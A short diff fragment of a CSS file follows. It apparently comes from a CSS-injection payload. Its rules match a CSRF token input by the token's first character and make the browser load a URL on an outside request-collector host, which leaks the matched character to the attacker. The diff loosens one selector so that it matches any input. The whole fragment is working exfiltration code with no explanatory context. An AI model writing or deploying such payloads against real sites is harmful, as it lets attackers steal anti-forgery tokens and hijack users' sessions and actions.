@@ -63,7 +63,7 @@ input[name="csrf"][value^="w"] {--s0:url(https://en6gc9c8vfzvo.x.pipedream.net/?
 
 input[name="csrf"][value^="x"] {--s0:url(https://en6gc9c8vfzvo.x.pipedream.net/?0=x)}
 
-input[name="csrf"][value^="y"] {--s0:url(https://en6gc9c8vfzvo.x.pipedream.net/?0=y)}
+input[value^="y"] {--s0:url(https://en6gc9c8vfzvo.x.pipedream.net/?0=y)}
 
 input[name="csrf"][value^="z"] {--s0:url(https://en6gc9c8vfzvo.x.pipedream.net/?0=z)}
 
